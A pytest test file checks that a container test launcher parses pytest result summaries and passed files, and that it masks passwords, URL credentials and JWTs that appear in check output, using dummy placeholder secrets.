@pytest.mark.parametrize("noise", ["{header}.", "checking format -----BEGIN " + "PRIVATE" + " KEY-----"])
def test_a_printed_public_header_or_key_marker_keeps_passing_evidence(L, monkeypatch, noise):
    import base64
    header = base64.urlsafe_b64encode(b'{"alg":"RS256"}').decode().rstrip("=")
    out = (noise.format(header=header) + "\nPASSED tests/test_b.py::test_two\n1 passed in 0.1s\n").encode()
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    result = L.run_container(["docker"], b"", 5, "checks")
    assert result["summary"] == "1 passed in 0.1s" and result["passed_files"] == ["tests/test_b.py"]
    assert result["failures"] == []


def test_subtest_summaries_count_as_pytest_results(L, monkeypatch):
    out = ("format -----BEGIN " + "PRIVATE" + " KEY-----\nPASSED tests/test_sub.py::test_sub\n"
           "1 passed, 1 subtests passed in 0.01s\n").encode()
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    assert L.run_container(["docker"], b"", 5, "checks")["summary"] == "1 passed, 1 subtests passed in 0.01s"


def test_launcher_masking_keeps_the_base_whole_value(L):
    assert "Tr0ub4dor3xyz" not in L.mask("E   AssertionError: DB_PASSWORD=hunter2hunter2,Tr0ub4dor3xyz")


@pytest.mark.parametrize("url", ["https" + "://bob:" + "Pw9_token=abcdefgh@hostname",   # built: no URL-shaped
                                 "https" + "://refresh_token:" + "abcdefgh@hostname"])   # literal in the public repo
def test_launcher_masks_url_userinfo_before_key_value_rules(L, url):
    out = stage_c_runner._redact_secrets(L.mask("E   " + url))
    assert out == "E   https://***@hostname"


@pytest.mark.parametrize("path", ["tests/test_token_refresh_flow.py", "tests/tokens/test_cache.py",
                                  "tests/test_bearer_token_parsing.py"])
def test_token_named_test_files_still_count_as_passed(L, monkeypatch, path):
    out = f"PASSED {path}::test_a\n1 passed in 0.1s\n".encode()
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    assert L.run_container(["docker"], b"", 5, "checks")["passed_files"] == [path]


def test_a_jwt_wrapped_inside_its_header_in_check_output_is_withheld(L, monkeypatch):
    import base64, os
    b = lambda raw: base64.urlsafe_b64encode(raw).decode().rstrip("=")
    jwt = b(json.dumps({"alg": "RS256", "typ": "JWT", "kid": "k" * 40}).encode()) + "." + b(os.urandom(280)) + "." + b(os.urandom(256))
    out = ("FAILED tests/test_a.py::test_one - AssertionError\n" + "".join("E   " + jwt[i:i + 76] + "\n" for i in range(0, len(jwt), 76))
           + "1 failed in 0.1s\n").encode()
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    result = L.run_container(["docker"], b"", 5, "checks")
    assert result["failures"] == [L.WITHHELD] and jwt[80:160] not in json.dumps(result)
